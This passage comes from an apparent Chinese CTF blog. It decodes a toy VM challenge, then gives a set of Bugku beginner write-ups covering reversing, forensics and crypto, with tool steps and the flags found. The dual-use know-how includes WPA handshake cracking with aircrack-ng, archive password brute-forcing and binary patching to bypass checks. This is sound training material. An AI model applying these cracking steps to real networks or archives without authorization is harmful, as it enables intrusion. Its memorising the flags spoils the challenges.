                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1579178347263.png" alt="1579178347263" title class>
                <p>1579178347263</p>
            </figure>
<p>0xf2代表异或， xor，与0x34异或。</p>
<p>其中a1^=a1[1]^0x34,中a[1]的值为0</p>
<p><strong>sub_4006F4   (0xf5)</strong></p>
<figure class="image-box">
                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1579179967857.png" alt="1579179967857" title class>
                <p>1579179967857</p>
            </figure>
<p>0xf5为read()函数</p>
<p><strong>sub_40094e</strong></p>
<figure class="image-box">
                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1579176746772.png" alt="1579176746772" title class>
                <p>1579176746772</p>
            </figure>
<p>该函数是对6010A0操作码内容的执行，一直到0xf4结束</p>
<p><strong>sub_400986</strong></p>
<figure class="image-box">
                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1579176715766.png" alt="1579176715766" title class>
                <p>1579176715766</p>
            </figure>
<p>非常明显，这是一个check函数，异或加密后输入内容，与byte_601080的内容进行对比。这里注意的是，我们输入的内容在经过异或加密后存储地址变更为s[0x20]~s[0x2c]。</p>
<h1 id="0x1-虚拟化指令分析"><a href="#0x1-虚拟化指令分析" class="headerlink" title="0x1 虚拟化指令分析"></a>0x1 虚拟化指令分析</h1><p><strong>unk_6010A0内容</strong></p>
<p>0xf5,                                                     </p>
<p>0xf1,0xe1,0x0,0x0,0x0,0x0,             </p>
<p>0xf2,   </p>
<p>0xf1,0xe4,0x20,0x0,0x0,0x0,</p>
<p>0xf1,0xe1,0x1,0x0,0x0,0x0,</p>
<p>0xf2,</p>
<p>0xf1,0xe4,0x21,0x0,0x0,0x0,</p>
<p>0xf1,0xe1,0x2,0x0,0x0,0x0, </p>
<p>0xf2,</p>
<p>0xf1,0xe4,0x22,0x0,0x0,0x0,</p>
<p>0xf1,0xe1,0x3,0x0,0x0,0x0, </p>
<p>0xf2,</p>
<p>0xf1,0xe4,0x23,0x0,0x0,0x0,</p>
<p>0xf1,0xe1,0x4,0x0,0x0,0x0, </p>
<p>0xf2,</p>
<p>0xf1,0xe4,0x24,0x0,0x0,0x0,</p>
<p>0xf1,0xe1,0x5,0x0,0x0,0x0, </p>
<p>0xf2,</p>
<p>0xf1,0xe4,0x25,0x0,0x0,0x0,</p>
<p>0xf1,0xe1,0x6,0x0,0x0,0x0, </p>
<p>0xf2,</p>
<p>0xf1,0xe4,0x26,0x0,0x0,0x0,</p>
<p>0xf1,0xe1,0x7,0x0,0x0,0x0, </p>
<p>0xf2,</p>
<p>0xf1,0xe4,0x27,0x0,0x0,0x0,</p>
<p>0xf1,0xe1,0x8,0x0,0x0,0x0, </p>
<p>0xf2,</p>
<p>0xf1,0xe4,0x28,0x0,0x0,0x0,</p>
<p>0xf1,0xe1,0x9,0x0,0x0,0x0, </p>
<p>0xf2,</p>
<p>0xf1,0xe4,0x29,0x0,0x0,0x0,</p>
<p>0xf1,0xe1,0xa,0x0,0x0,0x0, </p>
<p>0xf2,</p>
<p>0xf1,0xe4,0x2a,0x0,0x0,0x0,</p>
<p>0xf1,0xe1,0xb,0x0,0x0,0x0, </p>
<p>0xf2,</p>
<p>0xf1,0xe4,0x2b,0x0,0x0,0x0,</p>
<p>0xf1,0xe1,0xc,0x0,0x0,0x0, </p>
<p>0xf2,</p>
<p>0xf1,0xe4,0x2c,0x0,0x0,0x0,</p>
<p>0xf4  </p>
<p>分析结果：</p>
<p>read</p>
<p>r1 = s[0]</p>
<p>r1 ^= 0x34</p>
<p>s[0x20] = r1</p>
<p>r1 = s[1]</p>
<p>r1 ^= 0x34</p>
<p>s[0x21] = r1</p>
<p>r1 = s[2]</p>
<p>r1 ^= 0x34</p>
<p>s[0x22] = r1</p>
<p>r1 = s[3]</p>
<p>r1 ^= 0x34</p>
<p>s[0x23] = r1</p>
<p>r1 = s[4]</p>
<p>r1 ^= 0x34</p>
<p>s[0x24] = r1</p>
<p>r1 = s[5]</p>
<p>r1 ^= 0x34</p>
<p>s[0x25] = r1</p>
<p>r1 = s[6]</p>
<p>r1 ^= 0x34</p>
<p>s[0x26] = r1</p>
<p>r1 = s[7]</p>
<p>r1 ^= 0x34</p>
<p>s[0x27] = r1</p>
<p>r1 = s[8]</p>
<p>r1 ^= 0x34</p>
<p>s[0x28] = r1</p>
<p>r1 = s[9]</p>
<p>r1 ^= 0x34</p>
<p>s[0x29] = r1</p>
<p>r1 = s[10]</p>
<p>r1 ^= 0x34</p>
<p>s[0x2a] = r1</p>
<p>r1 = s[11]</p>
<p>r1 ^= 0x34</p>
<p>s[0x2b] = r1</p>
<p>r1 = s[12]</p>
<p>r1 ^= 0x34</p>
<p>s[0x2c] = r1</p>
<p>ret</p>
<h1 id="0x2-解密"><a href="#0x2-解密" class="headerlink" title="0x2  解密"></a>0x2  解密</h1><p>s=[‘\x75’,’\x6b’,’\x51’,’\x00’,’\x47’,’\x6d’,’\x6b’,’\x42’,’\x59’,’\x15’,’\x15’,’\x15’,]</p>
<p>flag=’’</p>
<p>l=len(s)</p>
<p>s=list(map(ord,s))</p>
<p>for i in range(l):</p>
<p>​    num=s[i]^0x34</p>
<p>​    flag+=chr(num)</p>
<p>print(flag)</p>
<p>flag：A_e4sY_vm!!!</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Freshman WP]]></title>
      <url>/2019/03/23/Freshman-wp/</url>
      <content type="html"><![CDATA[<h1 id="Bugku"><a href="#Bugku" class="headerlink" title="Bugku"></a>Bugku</h1><p>一 CTF练习（<a href="http://ctf.ssleye.com/" target="_blank" rel="noopener">[http://ctf.ssleye.com/]{.underline}</a> ctf在线工具）</p>
<ol>
<li><h2 id="逆向安全"><a href="#逆向安全" class="headerlink" title="逆向安全"></a>逆向安全</h2></li>
</ol>
<blockquote>
<p><strong>Easy-vb</strong></p>
<p>首先查壳</p>
<figure class="image-box">
                <img src="https://winterze-picture-bed.oss-cn-beijing.aliyuncs.com/1.png?Expires=1553412732&OSSAccessKeyId=TMP.AQHNiO8TKf5Z2ARMI59IB5LPrTiCBktSnBtbBpg8XovB7W9B5yMlZwA-lF7nADAtAhUA3dLuqvzTRacOz0ldTKz9MTiGeo8CFFJEs09O6TJ8ewFeooZuJzRePJVZ&Signature=AiZ6V7fNl4zBsIqK%2FUNatqF7z2o%3D" alt title class>
                <p></p>
            </figure>
</blockquote>
<p>发现无壳</p>
<p>再使用od破解，反汇编窗口右键->中文搜索引擎->智能搜索 发现flag</p>
<figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image3.png" alt title class>
                <p></p>
            </figure>{width=”5.124359142607174in” height=”1.2498436132983377in”}<br><br><strong>Easy-Re </strong><br><br>打开<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image4.png" alt="C:\Users\admin\AppData\Roaming\Tencent\Users\1498479038\TIM\WinTemp\RichOle\8D~`OM$96Y~D7RWDF{BQ)AB.png" title class>
                <p>C:\Users\admin\AppData\Roaming\Tencent\Users\1498479038\TIM\WinTemp\RichOle\8D~`OM$96Y~D7RWDF{BQ)AB.png</p>
            </figure>{width=”3.8541666666666665in” height=”1.3854166666666667in”}<br><br>查壳 发现无壳<br><br><figure class="image-box">
                <img src="media/image5.png" alt="C:\Users\admin\AppData\Roaming\Tencent\Users\1498479038\TIM\WinTemp\RichOle\F@D%]2EQCMJN(C:/Users/dell/Desktop/media/image5.png)5)93WM.png" title class>
                <p>C:\Users\admin\AppData\Roaming\Tencent\Users\1498479038\TIM\WinTemp\RichOle\F@D%]2EQCMJN(C:/Users/dell/Desktop/media/image5.png)5)93WM.png</p>
            </figure>{width=”4.395833333333333in” height=”2.9895833333333335in”}<br><br>载入OD 反汇编窗口右键->中文搜索引擎->智能搜索 发现flag<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image6.png" alt="C:\Users\admin\AppData\Roaming\Tencent\Users\1498479038\TIM\WinTemp\RichOle\M(`{60PX0JK%$3R0MCUR(ZQ.png" title class>
                <p>C:\Users\admin\AppData\Roaming\Tencent\Users\1498479038\TIM\WinTemp\RichOle\M(`{60PX0JK%$3R0MCUR(ZQ.png</p>
            </figure>{width=”6.072916666666667in” height=”2.1145833333333335in”}<br><br>运行，确认为所需flag<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image7.png" alt title class>
                <p></p>
            </figure>{width=”3.28125in” height=”1.6666666666666667in”}<br><br><strong>游戏过关</strong><br><br>下载打开<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image8.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”3.0145833333333334in”}<br><br>查壳 发现无壳<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image9.png" alt title class>
                <p></p>
            </figure>{width=”4.395284339457568in” height=”2.989209317585302in”}<br><br>载入OD，可以发现两个重要的段<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image10.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”1.4534722222222223in”}<br><br>单击载入找到所在位置，发现第一段的跳转并修改，使其跳到done！！！ flag is处，f8向下<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image11.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”5.768055555555556in”}<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image12.png" alt title class>
                <p></p>
            </figure>{width=”4.374453193350831in” height=”1.2081824146981628in”}<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image13.png" alt title class>
                <p></p>
            </figure>{width=”5.113943569553806in” height=”1.5935509623797026in”}<br><br>最后 ，会出现flag<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image14.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”3.332638888888889in”}<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image15.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”3.0145833333333334in”}<br><br><strong>逆向入门</strong><br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image16.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”1.3652777777777778in”}<br><br>查壳 发现不是有效的PE文件<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image17.png" alt title class>
                <p></p>
            </figure>{width=”4.395284339457568in” height=”2.989209317585302in”}<br><br>载入WinHex<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image18.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”2.3875in”}<br><br>发现是一张图片的base64编码<br><br>复制到浏览器上，可得<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image19.png" alt title class>
                <p></p>
            </figure>{width=”4.302083333333333in” height=”2.9958158355205597in”}<br><br>扫描可得flag<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image20.png" alt title class>
                <p></p>
            </figure>{width=”3.77036198600175in” height=”0.635336832895888in”}<br><br><strong>Love</strong><br><br>下载打开<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image21.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”1.2097222222222221in”}<br><br>查壳 无壳<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image22.png" alt title class>
                <p></p>
            </figure>{width=”4.395284339457568in” height=”2.989209317585302in”}<br><br>载入OD<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image23.png" alt title class>
                <p></p>
            </figure>{width=”2.583010717410324in” height=”0.7186603237095363in”} base64解密<br><br>## 1.  杂项<br><br>&gt; <strong>签到题</strong><br>&gt;<br>&gt; 扫码，即可得到flag<br>&gt;<br>&gt; <strong>这是一张单纯的图片</strong><br>&gt;<br>&gt; 下载图片，用winhex查看在文件末尾发现一处数据信息<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image24.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”2.783333333333333in”}<br>&gt;<br>&gt; HTML解码得到flag<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image25.png" alt title class>
                <p></p>
            </figure>{width=”4.059706911636045in” height=”4.739583333333333in”}<br>&gt;<br>&gt; <strong>隐写</strong><br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image26.png" alt title class>
                <p></p>
            </figure>{width=”2.1458333333333335in” height=”1.5622014435695537in”}<br>&gt;<br>&gt; 下载2.rar，解压得到一张图片；放入winHex<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image27.png" alt title class>
                <p></p>
            </figure>{width=”4.802083333333333in” height=”2.5519378827646544in”}<br>&gt;<br>&gt; 89 50 4E 47 PE头是png照片，所以没有Exif信息的可能；图片放入Linux下打不开，说明图片被截，将图片高和宽改为一致（将A4改为F4）<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image28.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”1.4777777777777779in”}<br>&gt;<br>&gt; 打开图片 ，得到flag<br>&gt;<br>&gt; <strong>telnet</strong><br>&gt;<br>&gt; 打开1.zip，解压得到一个流量包文件，载入wireshark，提示了telnet，所以使用规则显示telnet包，追踪TCP流<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image29.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”4.577083333333333in”}<br>&gt;<br>&gt; 得到 flag<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image30.png" alt title class>
                <p></p>
            </figure>{width=”3.2395833333333335in” height=”3.6836187664041993in”}<br>&gt;<br>&gt; <strong>眼见非实</strong><br>&gt;<br>&gt; 下载，放入winhex查看，发现是zip格式，内部还有.dox<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image31.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”2.283333333333333in”}<br>&gt;<br>&gt; 修改扩展名，解压得到.dox,但是无法打开，再放入winhex中查看<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image32.png" alt title class>
                <p></p>
            </figure>{width=”4.197391732283465in” height=”1.1248589238845144in”}<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image33.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”1.3659722222222221in”}<br>&gt;<br>&gt; 发现PE头 是zip，修改.dox为.zip，解压；再文件内word->document.xml (记事本打开) 找到flag<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image34.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”2.0597222222222222in”}<br>&gt;<br>&gt; <strong>有一张图片，还单纯吗</strong><br>&gt;<br>&gt; 像图片载入winhex<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image35.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”1.9152777777777779in”}<br>&gt;<br>&gt; 发现有exif信息，放入kali<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image36.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”2.8465277777777778in”}<br>&gt;<br>&gt; 用foremost 分离，分离一个图片，打开得到flag<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image37.png" alt title class>
                <p></p>
            </figure>{width=”4.634837051618548in” height=”0.9582130358705162in”}<br>&gt;<br>&gt; <strong>猜</strong><br>&gt;<br>&gt; 下载图片，载入到winhex中修改宽高无法还原<br>&gt;<br>&gt; 在百度图片搜索 ，找到人名<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image38.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”3.995833333333333in”}<br>&gt;<br>&gt; <strong>宽带信息泄露</strong><br>&gt;<br>&gt; 下载打开，载入RouterPassView工具查看<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image39.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”4.326388888888889in”}<br>&gt;<br>&gt; 提示flag{宽带用户名}，查找username<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image40.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”4.326388888888889in”}<br>&gt;<br>&gt; 找到了<br>&gt;<br>&gt; <strong>隐写3</strong><br>&gt;<br>&gt; 下载解压打开，有一张大白图片，感觉被截了，载入winhex查看<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image41.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”1.7069444444444444in”}<br>&gt;<br>&gt; 把宽和高修改一致<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image42.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”1.2618055555555556in”}<br>&gt;<br>&gt; 再次打开图片得到flag<br>&gt;<br>&gt; <strong>多种方法解决</strong><br>&gt;<br>&gt; 下载，解压得到一个无法打开的KEY.exe，放入winhex查看，发现是base64传图片<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image43.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”3.895138888888889in”}<br>&gt;<br>&gt; 更改为.txt 将内容粘贴复制到百度，可以得到一个二维码，扫描即可得到flag<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image44.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”4.104166666666667in”}<br>&gt;<br>&gt; <strong>Linux</strong><br>&gt;<br>&gt; 下载解压得到 一个flag二进制文件，放入linux中，使用grep命令查找flag : grep ‘key’ -a flag<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image45.png" alt title class>
                <p></p>
            </figure>{width=”5.405574146981627in” height=”2.0726574803149607in”}<br>&gt;<br>&gt; 得到flag<br>&gt;<br>&gt; <strong>中国菜刀</strong><br>&gt;<br>&gt; 解压得到一个数据包，放入wireshark中然后再第一个http追踪TCP流，发现了flag.tar.gz<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image46.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”2.0131944444444443in”}<br>&gt;<br>&gt; 再kali中用binwalk提取<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image47.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”5.127777777777778in”}<br>&gt;<br>&gt; 得到了一个_caidao.pcapng.extracted,打开里面有个压缩包，解压后有一个flag.txt<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image48.png" alt title class>
                <p></p>
            </figure>{width=”4.520267935258093in” height=”1.5518897637795275in”}<br>&gt;<br>&gt; <strong>这么多数据包</strong><br>&gt;<br>&gt; 一开始一点一点看包，发现没有什么有用的信息，从104行开始发现大量404,每个端口还不一样,就是说在进行端口扫描，提示是先找到getshell流，猜想最后肯定是getshell了，从最后一条往前翻，然后追踪流，找到了一个txt文件<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image49.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”2.5381944444444446in”}<br>&gt;<br>&gt; 把base64解密可到flag<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image50.png" alt title class>
                <p></p>
            </figure>{width=”3.6581977252843396in” height=”4.270833333333333in”}<br>&gt;<br>&gt; <strong>隐写2</strong><br>&gt;<br>&gt; 首先，用winhex打开<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image51.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”1.5451388888888888in”}<br>&gt;<br>&gt; 图片嵌入exif信息，但是查看属性看不到有用信息，放入kali<br>&gt;<br>&gt; 使用binwalk提取<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image52.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”2.7930555555555556in”}<br>&gt;<br>&gt; 发现图片内有zip，使用foremost分离<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image53.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”1.2027777777777777in”}<br>&gt;<br>&gt; 打开 output文件，里面有zip文件<br>&gt;<br>&gt; 解压得到提示.jpg和flag.rar,根据提示知解压密码为3位数和扑克牌中KJQ有关，使用ARCHPP软件暴力破解可以得到 密码：871；解压的到3.jpg，放入winhex查看。<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image54.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”1.6826388888888888in”}<br>&gt;<br>&gt; 有疑似flag信息，将{}内信息进行base64解码<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image55.png" alt title class>
                <p></p>
            </figure>{width=”4.166776027996501in” height=”4.864583333333333in”}<br>&gt;<br>&gt; 得到flag<br>&gt;<br>&gt; <strong>做个游戏</strong><br>&gt;<br>&gt; <strong>想蹭网线解开密码</strong><br>&gt;<br>&gt; 下载，放入wireshark查找，wife认证重点是WPA的四次握手，也就是eapol协议的包，使用规则过滤<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image56.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”1.2486111111111111in”}<br>&gt;<br>&gt; 将wifi.cap放入kali，用python生成一个字典<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image57.png" alt title class>
                <p></p>
            </figure>{width=”3.84375in” height=”1.3966338582677165in”}<br>&gt;<br>&gt; Python wordlist.txt<br>&gt;<br>&gt; Aircrack-ng wifi.cap -w wordlist.txt<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image58.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”4.0152777777777775in”}<br>&gt;<br>&gt; 找到flag<br>&gt;<br>&gt; <strong>Linux2</strong><br>&gt;<br>&gt; 下载解压后，用记事本打开 查找key<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image59.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”3.8006944444444444in”}<br>&gt;<br>&gt; 发现flag<br>&gt;<br>&gt; <strong>账号被盗了</strong><br>&gt;<br>&gt; <strong>细心的大象</strong><br>&gt;<br>&gt; 解压得到一个1.jpg图片，查看属性，发现一段base64加密内容<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image60.png" alt title class>
                <p></p>
            </figure>{width=”3.9161767279090114in” height=”3.6870395888014in”}<br>&gt;<br>&gt; 解码得到<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image61.png" alt title class>
                <p></p>
            </figure>{width=”3.1942311898512687in” height=”3.7291666666666665in”}<br>&gt;<br>&gt; 把图片放入winhex中，查看图片信息<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image62.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”2.872916666666667in”}<br>&gt;<br>&gt; 正常.jpg图片文件前12字节16进制数是<br>&gt;<br>&gt; FF D8 FF E0 00 10 4A 46 49 46 00 01<br><br>所以将图片改为.zip放入kali<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image63.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”2.5708333333333333in”}<br><br>&gt; Output内有rar文件加密的压缩包，猜测之前的解码就是密码，解压得到一张图片，linux中无法显示，windows下可以显示，说明图片被截，放入winhex中进行修改，得到的图片中含有flag<br>&gt;<br>&gt; <strong>爆照</strong><br>&gt;<br>&gt; 得到照片放入winhex中，在文件末尾发现不明所以的东西<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image64.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”7.007638888888889in”}<br>&gt;<br>&gt; 将其放入kali<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image65.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”3.2381944444444444in”}<br>&gt;<br>&gt; 有foremost分离得到<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image66.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”2.151388888888889in”}<br>&gt;<br>&gt; 将这些文件在kali一一提取，发现了三个被修改的图片<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image67.png" alt title class>
                <p></p>
            </figure>{width=”3.753059930008749in” height=”3.5104166666666665in”}<br><br>88：bilibili<br><br>888：(右键属性)得到(c2lsaXNpbGk=)base64解码，得到silisili<br><br>8888里面还有一个zip压缩包，修改后缀为zip，解压得到一个二维码，扫描得到panama<br><br>而且flag的格式是flag{xxx_xxx_xxx}，gif提示排序，那就按顺序排在一起，使用”_“隔开,得到flag<br><br>&gt; <strong>流量分析</strong><br>&gt;<br>&gt; <strong>图穷匕见</strong><br>&gt;<br>&gt; <strong>Convert</strong><br>&gt;<br>&gt; <strong>听首音乐</strong><br>&gt;<br>&gt; <strong>好多数值</strong><br>&gt;<br>&gt; <strong>普通的数独</strong><br>&gt;<br>&gt; <strong>好多压缩包</strong><br>&gt;<br>&gt; <strong>一个普通的压缩包</strong><br>&gt;<br>&gt; <strong>妹子的陌陌</strong><br>&gt;<br>&gt; <strong>就五层你能解开吗</strong><br><br>## 1.  密码<br><br>&gt; <strong>滴答~滴</strong><br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image68.png" alt title class>
                <p></p>
            </figure>{width=”2.5in” height=”2.033132108486439in”}<br>&gt;<br>&gt; 密码类型是：摩斯密码<br>&gt;<br>&gt; <a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx" target="_blank" rel="noopener">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</a><br>&gt;<br>&gt; 在线破解，得到KEY{BKCTFMISC}<br>&gt;<br>&gt; <strong>聪明的小羊</strong><br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image69.png" alt title class>
                <p></p>
            </figure>{width=”2.2916666666666665in” height=”1.8812882764654417in”} 栅栏密码，每组数为2<br>&gt;<br>&gt; 在线破解[<strong><a href="http://www.qqxiuzi.cn/bianma/zhalanmima.php" target="_blank" rel="noopener">http://www.qqxiuzi.cn/bianma/zhalanmima.php</a></strong>]{.underline}<br>&gt;<br>&gt; 得到KEY{sad23jjdsa2}<br>&gt;<br>&gt; <strong>Ok &amp; 这不是摩斯密码</strong><br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image70.png" alt title class>
                <p></p>
            </figure>{width=”5.03125in” height=”1.0963834208223973in”}<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image71.png" alt title class>
                <p></p>
            </figure>{width=”2.3645833333333335in” height=”2.81912510936133in”}<br>&gt;<br>&gt; 密码类型：Brainfuck / OoK！<br>&gt;<br>&gt; 在线破解<br>&gt;<br>&gt; <a href="http://tool.bugku.com/brainfuck/" target="_blank" rel="noopener">http://tool.bugku.com/brainfuck/</a><br>&gt;<br>&gt; <strong>简单加密</strong><br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image72.png" alt title class>
                <p></p>
            </figure>{width=”2.78125in” height=”1.981781496062992in”}<br>&gt;<br>&gt; 看到密文以AA结尾，猜测是凯撒和base64混合加密；<br>&gt;<br>&gt; 参照ASII列表，A是65，=是61，偏移4位，所以写个python脚本将所有的字符都偏移4位<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image73.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”2.002083333333333in”}<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image74.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”1.44375in”}<br>&gt;<br>&gt; 得到base64字符串 ，进行解密<br>&gt;<br>&gt; key{68743000650173230e4a58ee153c68e8}<br>&gt;<br>&gt; 在线工具：[<a href="http://tool.chinaz.com/tools/base64.aspx]{.underline}" target="_blank" rel="noopener">http://tool.chinaz.com/tools/base64.aspx]{.underline}</a><br>&gt;<br>&gt; <strong>一段Base64</strong><br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image75.png" alt title class>
                <p></p>
            </figure>{width=”3.2395833333333335in” height=”2.7255785214348207in”}<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image76.png" alt title class>
                <p></p>
            </figure>{width=”3.2708333333333335in” height=”2.327308617672791in”}<br>&gt;<br>&gt; 使用convert工具<br>&gt;<br>&gt; Base64-><br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image77.png" alt title class>
                <p></p>
            </figure>{width=”4.625in” height=”5.39954615048119in”}<br><br>&gt; <figure class="image-box">
